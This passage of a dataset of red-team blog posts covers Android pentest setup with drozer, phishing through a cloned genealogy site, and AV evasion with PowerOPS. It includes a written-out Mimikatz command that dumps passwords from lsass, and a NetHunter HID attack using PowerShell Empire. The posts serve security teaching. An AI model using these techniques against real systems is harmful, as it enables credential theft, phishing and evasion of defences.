wearable images. For this article, the screenshot below shows me selecting the Intel images and Android APIs to install.\n\nTo complete the package installation, click on \u201cinstall packages\u201d. After the downloads complete, exit this GUI.\n\nCreating an Emulated Device\n\nIn order to start up the Android Virtual Device Manager, type the command \u201candroid avd\u201d as follows:\n\n$ android avd\n\nNext, we will create an emulated virtual device using the \u201cIntel Atom 64-bit\u201d image, and a Nexus 4, which has only modest memory requirements. Click on the \u201cCreate\u201d button to create a new AVD.\n\nThe options we are going to use to create our AVD are as follows:\n\nName: pentest1\n\nDevice: Nexus 4\n\nTarget: Android 6 - API Level 23\n\nNo skin, and Emulated Camera\n\n2048 MB RAM, and make sure to select the \u201cUse Host GPU\u201d button\n\n Creating a new AVD \n\nIf everything is working correctly, you should see a popup showing the options that the device was created with.  You should then see the new device in the list of AVDs on the main screen. You can now close this window.\n\nTo check for the list of AVDs in your emulation library, you can do this:\n\n$ emulator -list-avds\npentest1\n\nYou should see the new \u201cpentest1\u201d AVD that you just created. To start the emulator, use the command as follows:\n\n$ emulator -avd pentest1\n\nIf everything goes as planned, you should see a nice Android emulator pop up on your screen.\n\n A Running AVD Emulator \n\n_____\n\nEditor\u2019s Note:  Check out Part 3: Installing the drozer Attack Framework.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Android Dev & Penetration Testing Setup  Part 3: Installing the drozer Attack Framework\"\nTaxonomies: \"Author, Joff Thyer, Mobile, Red Team\"\nCreation Date: \"Mon, 23 Jan 2017 15:39:31 +0000\"\nJoff Thyer //\n\nEditor\u2019s Note:  This is part 3 of a 3 part series.  Part 1 discussed configuring your virtual machine engine and virtual hardware emulation.  Part 2 covered installing Android for the emulator, and this part covers installing the drozer attack framework.\n\nOnce your emulator is up and running, it is now time to have some sideloading fun. The folks at MWR labs have created an awesome Android attack framework called \u201cdrozer\u201d. The framework consists of software that needs to be installed on Ubuntu, as well as an \u201cAPK\u201d file that needs to be sideloaded onto your emulated Android.\n\nFirst, you need to download both the \u201cUbuntu/Debian\u201d package and the drozer Agent APK files from MWR labs. The following screenshots show what you are looking for:\n\n Debian/Ubuntu Package \n\n drozer Agent APK file \n\nAfter the downloads are complete, perform the Ubuntu/Debian package installation first, as follows:\n\n$ sudo dpkg -i ~/Downloads/drozer_2.3.4.deb\n\nNOTE: this will look like it totally and utterly fails due to dependency problems. DON\u2019T PANIC! Simply fix it as follows:\n\n$ sudo apt install -f\n\nSeriously? It\u2019s that simple? Yes!  This will nicely install all of the required dependencies for you. It seems a little backward, and counterintuitive, but trust me, this will work well.\n\nHere are some screenshots of when I was testing:\n\nOnce all of the dependencies are fixed, you can verify whether drozer runs as shown in this screenshot.\n\nSide-Loading the Drozer Agent APK\n\nNow it\u2019s time to use our Android emulator to sideload the drozer APK package. In addition to this, if we have another APK we want to perform penetration testing against, we probably want to sideload that APK file as well.\n\nThe first steps are to make sure your emulator is running, check access with ADB, and sideload packages as needed.\n\n$ emulator -avd pentest1 &\n$ adb devices\nList of devices attached\nemulator-5554 device\n$ adb install ~/Downloads/drozer-agent-2.3.4.apk\n[100%] /data/local/tmp/drozer-agent-2.3.4.apk\n   pkg: /data/local/tmp/drozer-agent-2.3.4.apk\nSuccess\n\nIf all goes as planned, you should be able to locate the drozer Agent within your Android App list.\n\n Drozer Agent Installed \n\nIn order to use \u201cdrozer\u201d, we must start the agent App on the Android emulator, and then turn on the embedded server, which listens on TCP port 31415. In addition to this, we must use \u201cADB\u201d to forward the TCP port 31415 to the Android emulator so that we may communicate between the Ubuntu host and the Android drozer Agent. After forwarding the TCP communications, use the \u201cdrozer\u201d command under Ubuntu to connect to the drozer console.\n\n Connecting to the Drozer Console \n\nAt this stage, we have a fully operating attack framework and can use many of the reconnaissance, scanning, and attack commands that drozer provides for us. The example below simply lists Android packages on the system.\n\nThe various drozer modules have appropriate help associated with each. From a penetration testing perspective, you should treat this like any other penetration testing activity, meaning you need to perform reconnaissance, APK package information gathering of various providers, intents, broadcast receivers and so forth before starting to exploit some of the inherent weaknesses.\n\nThat should do the trick. I hope this prompts another complete set of new learning activities for you. There is a tremendous amount of resources about Android basics and architecture that you can obtain by reading the API guides. Visit https://developer.android.com for lots more information. Happy mobile hunting!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Phishing Family Tree Now: A Social Engineering Odyssey\"\nTaxonomies: \"InfoSec 201, Red Team, Social Engineering, Family Tree Now, genealogy, OSINT, phishing, social engineering\"\nCreation Date: \"Thu, 26 Jan 2017 15:26:47 +0000\"\nJoe Gray* //\n\nYou may have heard about a new genealogy tool called Family Tree Now. It is a (seemingly) 100% free tool (more on that later) that allows you to enumerate your family tree without having to enter much data (initially) beyond your name. While it can be useful - especially if family reunions are your thing, if you're doing a school project, or if you're trying to locate relatives - the issue here is that you are not the only one that may find it useful. As with anything, it can be used as a tool or a weapon. Just like a hammer, the determination comes from intention. Below is my analysis and application of the resource.\nMy Analysis\nI went through the Family Tree Now site and analyzed various policies to understand how they operate and what their goals are. In the About section, they talk about the company and the culture in vague terms. This feels like marketing hype, so I didn't spend much time there.\nTerms & Conditions\nIn the Terms and Conditions [link] (T&C) section, it talks about the uses for the site, both authorized and unauthorized. This is strange to me as they do not require any authentication to lock users out, aside from the presumable ability to block an IP address that is abusive. In the T&C, there is a provision that grants Family Tree Now a copyright on any data input into the system, which essentially allows them to copyright YOUR family data.\nIn terms (see what I did there?) of use, the T&C outlines it as such:\n\nOnly for appropriate, legal purposes, and in compliance with all applicable federal, state and local laws and regulations\nObtain any and all necessary licenses, certificates, permits, approvals or other authorizations required by federal, state or local statute, law or regulation that govern your use of the Services\nNot use the Services in a manner that may cause emotional or physical harm to anyone, or to \"stalk\" or otherwise harass another person\nNot use the Services to seek information about or harm minors in any way\nNot use the Services to seek information about celebrities or public figures\nNot use the Service to promote or provide instructional information about illegal activities or promote physical harm or injury against any group or individual\nNot resell any of the information you obtain from the Services without our prior written consent (They don't like competition)\nTake reasonable steps to ensure that the information you receive from the Services is stored in a secure manner\n\nPrivacy\nIn a nutshell, they collect information via account registration, interactions with features/functionality, \"cookies and other technologies we collect your IP address, device identifier, browser type, operating system, mobile carrier, and your ISP, and receive the URLs of sites from which you arrive on our Site,\" and interactions with third party sites. This is a very broad collection campaign. Back to the whole, what/who is the product debate.\nThe site admits to using the data to administer your account, customize the services, create and distribute advertising relevant to your experience, send you promotional communications through email, for internal business purposes, analyze trends and statistics, for audits/to determine the effectiveness of promotional campaigns, protect the security or integrity of applications and business, and to contact you if necessary.\nTo sum up what you can do: review and edit information, control messages, and close your account. Notice the term is close, not DELETE. I guess they forgot about Ashley Madison.\nI\u2019m no lawyer and I possess no formal legal training or expertise, but this sounds like we are the product. There are few provisions for the security of data collected, which is kind of logical for this type of site. That is the issue with the model of not requiring a barrier or barriers to entry such as payment or authentication.\nMonetization\nMonetization is addressed in the privacy policy. Ironic? Not really. If you're not paying for the service or product, often you become the product. This is sometimes the case even if you do pay, so do not let that aspect fool you. Michael Bazzell frequently talks about this with Justin Carroll on the Complete Privacy & Security Podcast.\nOSINT Angle\nThis is obviously an OSINT treasure chest. It includes lots of possibly sensitive information. It is publicly available on the internet - best of all, it's free. The only issue is that there is no API, and per the T&C, automated gathering is not permitted. From here, an attacker can confirm existing data or determine possible relationships to check out. This can enable the attacker to penetrate the inner circle of the target using different vectors and angles.\nSocial Engineering Angle\nI have always said that genealogy websites are a hacker's best friend when trying to social engineer beyond *ishing and when trying to reset passwords. I used to cite Ancestry.com or Genealogy.com as top leads for family oriented attacks, with Facebook being a close number 3. You can't keep Mom or Grandma from posting those embarrassing pictures and giving a narrative, right? In the past few months, I have added stick families on back windshields and now Family Tree Now to my arsenal as numbers 1 & 2.\nSo what can we do with the information we gather from Family Tree Now in Social Engineering attacks? This is a near limitless list. As with most (if not all) penetration testing and social engineering engagements, time is the limiting factor. If you have enough time, you can successfully perform Social Engineering on anyone. Below is a scenario that I cooked up using Family Tree Now:\nI cloned the website using Social Engineer Toolkit. \n\nThe resulting site is here\n\nNotice the difference in it and the REAL site:\n\nAt this point, I \"sprung\" the phishing email. Note that this is not the best email, but it is not the worst either.\nUpon clicking Validate, the victim would see this:\n\nShould they choose to opt-out, they'll end up here:\n\nClicking the link in the top of the email, they'll simply see the landing page (above).\nShould they provide any information or click any link, they end up with a \"payload.\"\nRegardless of what they do, I am keeping log data (which also records any inputs they provide)\n\nConclusion\nIn conclusion, the attack vector that I outlined is not unique to Family Tree Now. The timing of the attack is why I found it interesting. Because the site is expected to be asking for intimate and personal information, people who end up on the site are more apt to click one way or the other. Not having an API slows the attacks down from the perspective of the site. I feel like if authentication and/or payment were required, this would be much more of a non-issue. I have been singing the praises of using Ancestry.com for a while.\nThis is not really much different than using IntelTechniques or OSINTFramework for gathering OSINT on targets. Nor is this much different than Social Media. This will work as an excellent tool for validating and confirming the data that has already been gathered and when coupled with the social engineering attack, the success rate of any data gathering and payload delivery is amplified.\n__\n*A Guest post from Joe Gray, CISSP-ISSMP, GSNA, GCIH\nJoe Gray joined the U.S. Navy directly out of High School and served for seven years as a Submarine Navigation Electronics Technician. Joe is an Enterprise Security Consultant at Sword & Shield Enterprise Security in Knoxville, TN. Joe also maintains his own Blog and Podcast - Advanced Persistent Security. He is also in the SANS Instructor Development pipeline, teaching SANS Security 504: Hacker Tools, Techniques, Exploits, and Incident Handling. In his spare time, Joe enjoys reading news relevant to information security, attending information security conferences, contributing blogs to various outlets, bass fishing, and flying his drone. Follow him on Twitter and see his profile on LinkedIn.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Power Posing with PowerOPS\"\nTaxonomies: \"Author, Brian Fehrman, Red Team, Red Team Tools, AV, AV bypass, AV vendors, ESET, Kaspersky, PowerOPS, PowerOPS Frameword, PowerShell, Tipping Cash Cows\"\nCreation Date: \"Wed, 25 Jan 2017 16:13:06 +0000\"\nBrian Fehrman // \n\nAs described in my last blog post, Powershell Without Powershell \u2013 How To Bypass Application Whitelisting, Environment Restrictions & AV (sheeesh\u2026it\u2019s been a bit!), we are seeing more environments in which the execution of PowerShell Scripts are being detected or prevented. One way around those restrictions is to use a C# wrapper program to load the PowerShell scripts and execute them directly in the context of the .NET Framework. It is typically the case, however, that the wrapper has to be modified each time you run a new script. At the very least, you will likely need to modify some sort of config file that is read by the wrapper. This process can be a bit tedious and increases the chances of making a mistake. It would be nice to have all of the scripts consolidated into a single, compact framework. Introducing: PowerOPS Framework (https://github.com/fdiskyou/PowerOPS).\n\nThe PowerOPS Framework is the work of numerous people (none of whom is me) and their names are listed at the bottom of the GitHub page. Effectively, the framework is a collection of PowerShell scripts that are commonly used during the post-exploitation phase. Some of the scripts include: PowerView, Invoke-Mimikatz, Invoke-PSExec, and many others. Each script is embedded within the C# code itself so that you don\u2019t need to tote around and load in the scripts. All you have to do is compile the code, run the executable, and enjoy the awesome PowerShell-style interface that enables you to run the script functions with simple commands. You can also run normal PowerShell commands from the interface. This is all done without actually calling the powershell.exe binary.\n\nSo how do you get going with it? Well, let\u2019s walk through that process now. The one caveat is that you will need to have .NET Framework 4.0 or greater installed on the target system. For this example, I just installed Microsoft Management Framework 4 (https://www.microsoft.com/en-us/download/details.aspx?id=40855). Next, grab down the PowerOPS project from the GitHub link in the first part of this blog post. Extract the zip file after the download completes.\n\n Downloaded and Extracted PowerOPS Project \n\nNext, open up a command prompt and compile the project by using the following command (making sure to change the directory to match the location of your download):\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /unsafe \n\n/reference:\"C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\n\n\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" \n\n/reference:\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.IO.Compression.dll\" \n\n/out:C:\\users\\fmc\\Desktop\\PowerOPS_x64.exe /platform:x64 \n\n\"C:\\Users\\fmc\\Downloads\\PowerOPS-master\\PowerOPS-master\\PowerOPS\\*.cs\"\n\n Compilation Completed \n\nIf everything went well, you should now have an executable named PowerOPS_x64.exe on your desktop (or wherever you decided to put it).\n\n PowerOPS Binary \n\nNote that the command given was to compile for an x64 architecture. If you need to target x86 instead, use the following command (again, making sure to change the directory names to match your system):\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /unsafe\n/reference:\"C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf\n856ad364e35\\System.Management.Automation.dll\"\n/reference:\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\System.IO.Compression.dll\"\n/out:C:\\users\\fmc\\Desktop\\PowerOPS_x86.exe /platform:x86 \"C:\\Users\\fmc\\Downloads\\PowerOPS\nmaster\\PowerOPS-master\\PowerOPS\\*.cs\"\n\nTo run the PowerOPS binary, just double-click on it. You should be greeted with a command interface.\n\n PowerOPS Interface \n\nYou can see a list of the modules that are currently available by typing show into the interface.\n\n PowerOPS Modules \n\nThe commands that are present in each module are already imported for you. To see which commands are available in a module, you can type:\n\nget-command -module \n\nFor instance, to see the commands for the PowerUp module you would type:\n\nget-command -module PowerUp\n\n Snipper of Commands in PowerView Module \n\nLet\u2019s go ahead and run the Invoke-AllChecks command by simply typing:\n\nInvoke-AllChecks\n\n Snipper of Commands in PowerView Module \n\nWhat about if a command needs arguments and you can\u2019t remember what they are? No worries! As previously mentioned, you can still use normal PowerShell commands in this framework. Let\u2019s say that we want to run Invoke-ShareFinder but can\u2019t quite remember how. We can get examples for it by typing the following:\n\nGet-Help Invoke-ShareFinder -examples\n\n Getting Invoke-ShareFinder Examples \n\nI bet by now some of you have noticed the Invoke-Mimikatz function and are wondering, \u201cdoes it work?\u201d Well, yes but it might have a weird glitch. Close down PowerOPS and re-run it as an Administrator.\n\nAttempt to run Mimikatz by typing:\n\nInvoke-Mimikatz\n\nYou might get the output pictured below.\n\n Invoke-Mimikatz Unsuccessful \n\nI am not quite sure what the issue is here, but by virtue of complete dumb-luck I found that it seems to work if I first run Invoke-Mimikittenz before running Invoke-Mimikatz. I tried running a few other modules first and it didn\u2019t seem to fix the issue. I plan on looking at this more later\u2026but for now it is fun to run kittenz before katz.\n\nInvoke-Mimikittenz\n\nInvoke-Mimikatz\n\n Running Invoke-Mimikittenz Followed by Invoke-Mimikatz \n\nSo, what does AV have to say about this? We recently had our annual Sacred Cash Cow Tipping AV-Bypass webcast (WEBCAST: Sacred Cash Cow Tipping 2016). Sadly, a few AV vendors were feeling left out and they quickly contacted us to let us know\u2026and let us know they did. Don\u2019t worry folks, it\u2019s nothing personal. We just don\u2019t have enough time to include everybody. Lucky for some of you, I will do double-duty and make the time to include you here!\n\nThe first AV engine that I tested this against was ESET. ESET, admittedly, has a pretty snazzy interface with lots of cool bells and whistles. I turned on all of them (short of firewalling everything), updated the database, and attempted to run PowerOPS. No alert was given on the initial execution. Next, I ran the Invoke-Mimikatz function and\u2026success! I also did a manual scan on the executable and nothing was reported.\n\n ESET Scan of PowerOPS File \n\n Invoke-Mimikatz not Detected by ESET \n\nKaspersky though\u2026what about Kaspersky? I installed Kaspersky and also enabled all of the features, with the exception of whitelisting and locking down everything on the firewall. Honestly, if you\u2019re implementing a whitelisting-based approach in your environment then hats off to you! That is a test for another blog post. Here, we are just looking at the detection capabilities. I scanned the executable with Kaspersky and it stated that everything was good. I ran PowerOPS and issued the Invoke-Mimikatz command. The result? Success! At least\u2026so I thought\u2026.\n\nThe Invoke-Mimikatz call did succeed. After running it again so that I could grab a screenshot for this blog post, however, Kaspersky told me that it had detected the activity and was going to remove the file.\n\n Kaspersky Detecting Invoke-Mimikatz in PowerOPS \n\nSo, what gives? Did it write a new signature? Did its behavioral analysis engine learn something from the program executing? No, nothing quite that cool. It turns out that Kaspersky was taking a while to fully load. It\u2019s unclear if this is due to my VM (4GB, 2 cores, on an PCIe-SSD\u2026) or if it is just the nature of the program. It doesn\u2019t appear that Kaspersky\u2019s detections are effective during this loading window. I just happened to run my test during that time frame and it resulted in the Invoke-Mimikatz function not being detected.\n\n Kaspersky Loading \n\nDang, what to do now\u2026 On recent engagements, I have been skipping the use of Mimikatz on target systems since it does seem to get detected more frequently now. I have typically been using the PowerShell Procdump script (http://poshcode.org/4751)  to dump the lsass process of the target machine. I take that dump file offline and then run Mimikatz against it.  But for this test, I went ahead and grabbed that script and made some slight modifications. After the script executed the code to perform the process dump, I added a sleep time of 10 seconds. The sleep time is to help ensure that the dump routine has completed. After the sleep, I added the following code:\n\nInvoke-Mimikatz -Command \u201c`\u201csekurlsa::minidump $dmp`\u201d `\u201dsekurlsa::logonPasswords`\u201d\n\nThe previous command tells Mimikatz to run against the dump file that was created rather than attempting to scrape the memory directly. Here\u2019s what the snippet of code now looks like in the PowerShell Procdump script:\n\n Modified Powershell Procdump Script \n\nNow, we need to add this into the PowerOPS Framework. The authors made this process quite simple. The first step is to convert the Procdump script to a Base64-encoded form. I just copied and pasted the script into an online converter.\n\n Base64 Encoding Procdump Script \n\nNext, copy the Base64 code and open the PowerOPS.cs file in the PowerOPS directory. Notice the functions that are already present and mimic their structure in order to add the new script. This just involves creating a new function, naming it what you want (ProcDump, in this case), decoding the Base64 version of your script, and returning that decoded string. The snapshot below shows what this looks like. Your Base64 code just goes in between the set of double-quotes.\n\n Added ProcDump Function that Returns Decoded Form of Base64-Encoded Procdump Script \n\nThe next step is to open the Program.cs file in the PowerOPS folder. Find the portion in the code that has the series of pipeline.Commands.AddScript calls. Add in a call to the function that you created. You can see the addition in the following screenshot.\n\n Adding Call to Add the Procdump Script \n\nThe final step is needed to get our new functionality to display when we type the show command in the PowerOPS prompt. Go towards the top of the script and find the DisplayModules function. I went ahead and added the Get-ProcessDump string to the last Console. Write call. You can see this in the screenshot below.\n\nFinally, it\u2019s time to recompile the program. Issue the compilation command that we used earlier. Run the PowerOPS executable as an Administrator. Type the show command to see that the function has been added.\n\n Get-ProcessDump Displayed \n\nKick off the process dump and Mimikatz invocation against the lsass process by typing the following:\n\nGet-ProcessDump (ps lsass)\n\nAnd\u2026success! For real this time though!\n\nSuccessful Dump of Lsass and Password Extraction\n\nIn conclusion, I\u2019ve given an overview of the awesome PowerOPS framework and how to get started with it. Having many of the common PowerShell scripts in a single utility is very convenient. Plus, you are given the ability to run these scripts without the direct usage of powershell.exe. It appears to bypass some AV vendors as-is. For others, we had to take a bit of a side-adventure in order to work around their detection methods. This framework also has built-in application-whitelisting bypass techniques that I did not detail here but will do so in future blog posts. PowerOPS is a tool that could very handy for pentesters and I highly encourage you to check it out! ______ Follow Brian on Twitter @fullmetalcache\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to DIY a Mobile Hacking Platform - Kali NetHunter on a Rooted Nexus7\"\nTaxonomies: \"Author, Derek Banks, Physical, Red Team, Red Team Tools, DIY, DuckHunter, HID attack, KALI, Kali Linux, Kali NetHunter, mobile hacking platform, Mobile Pentesting Platform, Nexus7, Rooted Nexus7\"\nCreation Date: \"Mon, 30 Jan 2017 16:01:40 +0000\"\nDerek Banks //   \n\nAs pentesters, it is probably not a surprise that we tend to make fairly heavy use of Kali Linux on a fairly regular basis. The folks at Offensive Security have an amazing selection of options for platforms that can run Kali. \n\nOne of those platforms is Kali NetHunter which runs on multiple phones and tablets such as various Nexus and OnePlus devices.  But why would anyone want a hacking platform on a mobile device?  Aside from the obvious cool factor of running some of my day-to-day pentesting tools like Metasploit and Recon-ng on a mobile device what really is the point?\n\nI think a Mobile Pentesting Platform shines best on an onsite internal engagement that involves gaining unauthorized physical access (like a Red Team or Physical Pen Test), especially when it comes to HID keyboard style attacks like those possible with the USB Rubber Ducky.  I own multiple Rubber Ducky Devices and love them but a Mobile Pentesting Platform gives me the ability to have multiple HID attack options \u201con the fly\u201d that would otherwise mean I would have to carry multiple USB devices.  I like options.\n\nBefore we can pull off this style of HID attack though, we need to make the platform.  First, make sure your device is supported.  I had a Nexus 7 2012 Wi-Fi tablet that had been demoted to lab use and was already unlocked.  These tablets are relatively cheap on eBay and have great support for unlocking the bootloader and rooting through the Nexus Root Toolkit by WugFresh.  I chose this route and used a Windows 7 virtual machine and VirtualBox.\n\nInstalling Kali NetHunter\n\nFirst, download the appropriate NetHunter image for your device and check the file hash.  For a Nexus 7 2012 version the nethunter-grouper-lollipop-3.0 worked for me.  The instructions on the Offensive Security github wiki were up to date at the time of this post.\n\nhttps://github.com/offensive-security/kali-nethunter/wiki/Windows-install\n\nAs noted on their wiki, each step needs to be performed.  This is important because skipping any part may result in a nonfunctional install.  This post includes screenshots to help walk through the install.\n\nIf your tablet doesn\u2019t have developer mode enabled, do that.  This is an easy process.  On the device, go to Settings> About Tablet and tap on the \u201cBuild Number\u201d seven times.  Once that has been completed turn on Advanced Reboot and Android Debugging options.\n\nDownload and install the Nexus Root Toolkit on your Windows system (http://www.wugfresh.com/nrt/).\n\nNext, choose the initial setup \u201cFull Driver Installation Guide - Automatic + Manual\u201d option and follow all instructions on each step.  Step one removes the old drivers from the Windows install.\n\nRemove the Nexus 7 device from Device Manager and use USBDeview to remove everything else associated with an Android device and Google USB devices.\n\nDisable USB debugging and unplug and plug the tablet into the computer.  In a few moments, Windows should prompt to choose what to do with the device after driver configuration.  Select to view files and verify that the files system on the tablet can be accessed from Windows.  This needs to work to copy the Kali Nethunter Image to the tablet later.\n\nIn step 3 install the Google driver option (#1).  This consistently worked for me on 2 Nexus7 devices, so hopefully that is the case with most Nexus7 devices.  Follow the prompts on the driver installation dialog and if everything was successful, move to step 4.\n\nRun the \u201cFull Driver Test\u201d.  If everything was successful, NRT will let you know.  If something went south, start the process over, something may have been skipped over.\n\nIf you are using a virtual machine with VirtualBox you see an \u201cADB device was not found.\u201d message, check to make sure that the device is connected to the VM.\n\nNext, flash the device to a known good state.  Make sure any data you want off the device has been backed up elsewhere.  Since this is going to be a rooted mobile device running hacking software, do not use it as a \u201cdaily driver\u201d and put information you would consider sensitive or important on it.\n\nNRT makes the flash to stock process easy, choose the \u201cFlash Stock + Unroot\u201d option and follow the instructions.  If there is a prompt on the tablet to \u201cAllow USB Debugging?\u201d from the computer host, accept to allow. \n\nUse the recommended image for your device - for the Nexus7 the NAKASI-GROUPER: Android 5.1.1 - Build: LMY47V was what I chose.\n\nAfter the device has been flashed to stock, follow the device setup guide and re-enable Developer options and enable Advanced Reboot and Android Debugging options as before.  You should be prompted to allow USB debugging, check always allow and accept.\n\nNext click the choose the Root option, do not select custom recovery image.  NRT will push the necessary files to the tablet and reboot and go into TWRP.\n\nIf you are asked to \u201cKeep the System Read-only\u201d, I chose to allow writes by swiping to the right.  Once the process has completed, reboot the tablet.\n\nOnce the process has rebooted the tablet NRT will notify that it has completed.\n\nRepeat the root process again, this time checking the \u201cCustom Recovery\u201d option.  \n\nAfter the second root process as completed successfully, copy the nethunter-grouper-lollipop-3.0.zip file to the device.  I chose the Download directory.\n\nReboot the device and hold the power button and volume down.  At the bootloader screen, navigate to and select \u201cRecovery\u201d to boot into recovery mode.\n\nIn TWRP, choose install and select the nethunter-grouper-lollipop-3.0.zip file. Swipe to confirm the flash, then choose install packages.  I chose to install every option available.  Once the install has completed, reboot the device.\n\nAfter the flash, it may take a few minutes for the device to boot past the splash screen.  Once you have booted back up, NetHunter will now be installed.  \n\nPost Installation Configuration\n\nThere are a few tasks to complete after installation to get the DuckHunter HID attack to work.  First, we need to update NetHunter.  Open up the app and select \u201cCheck App Update\u201d.  If there is an update (there was at the time of this post) download it.  You will need to uninstall NetHunter to install the update, it will not install successfully over the existing install.\n\nGo into Settings>Apps and choose NetHunter and uninstall.  Once complete, the latest APK should now successfully install.  \n\nWhen initially attempting to use Rubber Ducky scripts with NetHunter, there was an issue loading the script into the DuckHunter HID feature with the native file system selection option.  The ZArchiver app from the Google Play store resolved this issue, this will be needed to load Rubber Ducky scripts.\n\nDuckHunter Attack and Demonstration (Shellz!)\n\nAt this point, NetHunter is ready to run the DuckHunter HID attack.  When on an engagement I like to have one USB Rubber Ducky set up to establish a PowerShell Empire session, we will use this to test out the functionality.\n\nUse your favorite VPS provider (I like DigitalOcean), setup an Ubuntu based server, and install PowerShell Empire from their Github repository.  Once set up, run PowerShell Empire and set up a listener.\n\nPowerShell Empire has a stager already built in to generate a Rubber Ducky script.  From the listener menu run usestager ducky to get to it.  Set the options of the stager to use the correct listener and set the OutFile to a location on the file system to write the script out to.\n\nCopy the script off the VPS system to the NetHunter tablet and the attack is now ready to be launched.  For a demonstration of this attack in action, take a look at the video below.\n\nhttps://youtu.be/9TxKuj_LYwA\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"GNU Screen Quick Reference\"\nTaxonomies: \"Author, Brian King, How-To, GNU screen, handwriting, learning, memory, reference, SSH session\"\nCreation Date: \"Wed, 01 Feb 2017 17:49:21 +0000\"\nBrian King //\n\nI use GNU Screen mainly to prevent processes from dying when I disconnect from an SSH session, but GNU Screen can do a whole lot more than that - the man page is about 3700 lines long. Clearly if I\u2019m using it only to keep a session alive, I\u2019m not using the bulk of what it can do.\nI made this cheat sheet and taped it to my monitor for a while so I can have these few options right in front of me every time I use Screen. This way, I more quickly memorize what I find useful, and develop a base to build on.\nWhen learning a new thing, my handwritten notes are far more helpful than anything typed. Sometimes I don\u2019t even look at the notes. Just the mental act of organizing the information, and the physical act of writing it - helps me remember.\nI thought I\u2019d share the idea and this small example in the hopes that it helps someone else learn something new, whether it\u2019s screen or something else.\nIn wading through the sea of options, I found two resources that were a huge help:\n\nhttp://aperiodic.net/screen/quick_reference\nhttps://tomlee.co/2011/10/gnu-screen-splitting/\n\nPublished by Google Drive\u2013Report Abuse\u2013Updated automatically every 5 minutes\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Pink Teaming: The Dilution of Pentesting\"\nTaxonomies: \"Author, John Strand, Red Team, industry trends, Pentesting, pink teaming, red teaming\"\nCreation Date: \"Wed, 08 Feb 2017 15:49:29 +0000\"\nJohn Strand //\n\nThere have been a few conversations at conferences and meet-ups over the past year or so about the validity of penetration testing. There are many things on the horizon of computer security that are going to be disruptive to the industry as a whole. And, in large part, these will be good for the industry. One of them is the rise of bug bounty programs. These are when an organization is hired to have a relatively obscure set of testers test your company resources. I have seen the results first hand, and they can be very good. They have their limitations and their strengths, but that is a topic for another blog.\nInstead, I want to focus on something we are seeing more and more of at BHIS. A steady watering down of penetration tests. Internally, we call these Pink Teams.\nA Pink Team is when the best of intentions of a Red Team get watered down. Most all the time, the direct technical contacts at the organizations we work with have the absolute best of intentions. They want a true test of their organization\u2019s ability to detect and react to advanced threats. But then, the test starts to get watered down. Restrictions from management and legal start to creep in. Sometimes, the concerns are very much legitimate based on FCC or HIPAA concerns. Any test is going to have some level of restrictions, and we expect that as it is part of doing business in this field. But, what I would like to talk about today is when the restrictions are not necessarily in line with a test at all. Rather, they border on the ridiculous. \nFor example, here are a handful of things we have dealt with over the past few months:\n\nCustomers actively watching for the testing IP addresses (which we gave at their request), then actively blocking them as soon as they see any traffic from them.\nCustomers watching exploited systems real-time and actively disabling cmd.exe and PowerShell as we are using them.\nSetting a large number of email addresses as \u201coff limits\u201d to phishing because they belong to important people in the organizations.\nHaving us stop testing as soon as we exploit a system, then take a week to let us begin again\u2026 Because, they did not think we would get in and, when we did, they did not know what to do.\nHaving a group of people authorize every system we intend to exploit. Then, disallowing exploitation on the most likely targets. \n\nI am writing these out not to poke fun at the customers, but rather, I want to address why this happens and how you can deal with it in your organization. \nThe first thing to understand is that these issues, at their core, are driven by a lack of understanding. While our direct contacts almost always understand how a test is going to work, the people who work with them may not. The single best way to handle this is by setting up lunch-and-learns where you can walk through what is going to happen during a test. We often do a webcast for systems administrators and developers to explain how they can remove the low hanging fruit from their environment. It is very common for me to have meetings with our customers\u2019 upper management to walk through what we are doing and why. It is also important to clearly explain that an untested path will be attacked. It is just a matter of time and training. \nI talk for a living. Teaching for SANS has exposed me to thousands of students, some of them hostile. I don\u2019t rattle very easily, and I can usually get my point across in less than an hour. I also have that \u201coutsider\u201d thing going for me. Many times I say the exact same things that my technical contacts have been saying to management for years. But, because I am from outside the organization, and sometimes for that reason only, management listens. \nThe reasons above are why you need to be constant in your conversations and brown bag sessions. Do not expect trust and understanding to simply appear in a one hour meeting - trust is established over time. Provide these meetings and sessions at least monthly. After a while you will develop the trust and the base understanding of security and testing within your organization. More importantly, they will start to trust you even more. This is the best defense against watering down of testing objectives. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Wi-Fi Travel Kits\"\nTaxonomies: \"Author, Jordan Drysdale, Red Team, Wireless, onsite, pen-testing, penetration testing, Pentesting, Wi-Fi travel kit, wireless kit\"\nCreation Date: \"Thu, 09 Feb 2017 16:50:03 +0000\"\nJordan Drysdale //\n\nSally and I recently ventured to an on-site wireless engagement with a very security-mature customer. Long story short, the level of protection that WPA2 Enterprise with certificate validation provides is worth the investment. If your wireless is running just pre-shared keys and provides access to critical infrastructure, it is time to invest in full wireless PKI.\nThe question Sally and I tried to answer before traveling was the obvious one before any engagement: \u201cWhat should we bring?\u201d Joff, being one of the almighty seers at BHIS recommended that \u201c...if it can wireless, bring it.\u201d\nAfter a couple of days spent on site, my emptied backpack ended up looking like this:\n\nSally\u2019s look like so (she is way more orderly!)\n\nSo, I ended with a couple of Raspberry Pi\u2019s, several battery packs, a couple of Ubiquiti devices, one 5GHz client and another 2.4GHz AP, another Engenius AP for testing PoE and port security (yes, this customer had all ports on lock-down too).\nFull List:\n\nVarious antennae for use with vehicle-based and on-foot investigations of the area\n\nAlfa black 1000mW / 1W 802.11g/n High Gain Adapter\nAlfa black 7dBi RP-SMA Panel\nAlfa gray 